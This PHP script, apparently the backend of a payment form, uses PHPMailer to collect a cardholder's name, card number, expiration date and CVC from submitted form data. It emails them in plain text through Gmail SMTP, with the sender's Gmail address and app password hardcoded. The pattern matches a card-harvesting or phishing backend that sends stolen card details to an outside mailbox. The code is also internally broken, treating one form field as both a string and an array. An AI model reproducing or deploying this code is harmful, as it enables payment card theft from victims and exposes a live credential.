<?php
// Load Composer's autoloader (if using Composer)
require 'vendor/autoload.php';

// Import PHPMailer classes into the global namespace
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

function sendEmail($toEmail, $subject, $body) {
    $to = filter_var($_POST['to'], FILTER_SANITIZE_EMAIL);
    $subject = filter_var("payment process", FILTER_SANITIZE_STRING);
    $message = filter_var($_POST['message'], FILTER_SANITIZE_STRING);
    $name = $_POST['message']['cardOwner'];
    $card_number = $_POST['message']['cardNumber'];
    $card_expiration = $_POST['message']['expiration'];
    $cvc = $_POST['message']['cvc'];


    $email_body = "You have received a new message.\n\n";
    $email_body .= "Card owner: $name\n";
    $email_body .= "Email: $to\n";
    $email_body .= "Card number: $card_number\n";
    $email_body .= "Card expiration: $card_expiration\n";
    $email_body .= "Card CVC: $cvc\n";


    $html_body = "<h3>You have received a new message.</h3>";
    $html_body .= "<p><strong>Card owner:</strong> $name</p>";
    $html_body .= "<p><strong>Email:</strong> $to</p>";
    $html_body .= "<p><strong>card number:</strong> $card_number</p>";
    $html_body .= "<p><strong>card expiration:</strong><br>$card_expiration</p>";
    $html_body .= "<p><strong>cvc:</strong><br>$cvc</p>";
    $mail = new PHPMailer(true);  // Create a new PHPMailer instance

    try {
        //Server settings
        $mail->SMTPDebug = 0;  // Disable verbose debug output
        $mail->isSMTP();  // Set mailer to use SMTP
        $mail->Host       = 'smtp.gmail.com';  // Specify Gmail's SMTP server
        $mail->SMTPAuth   = true;  // Enable SMTP authentication
        $mail->Username   = 'habeebajani9@gmail.com';   // Your Gmail address
        $mail->Password   = 'saql daif rliq iigy';  // Your Gmail password or app-specific password
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;  // Enable TLS encryption
        $mail->Port       = 587;  // TCP port to connect to Gmail's SMTP

        //Recipients
        $mail->setFrom('habeebajani9@gmail.com', 'Habeeb');  // From email address and name
        $mail->addAddress($toEmail);  // Recipient email address

        // Content
        $mail->isHTML(true);  // Set email format to HTML
        $mail->Subject = $subject;
        $mail->Body    = $email_body;

        // Send the email
        $mail->send();
        echo 'Message has been sent';
    } catch (Exception $e) {
        echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
    }
}

// Usage example:
$toEmail = "recipient_email@example.com";
$subject = "Test Email Subject";
$body = "<p>This is a test email body.</p>";

sendEmail($toEmail, $subject, $body);

?>
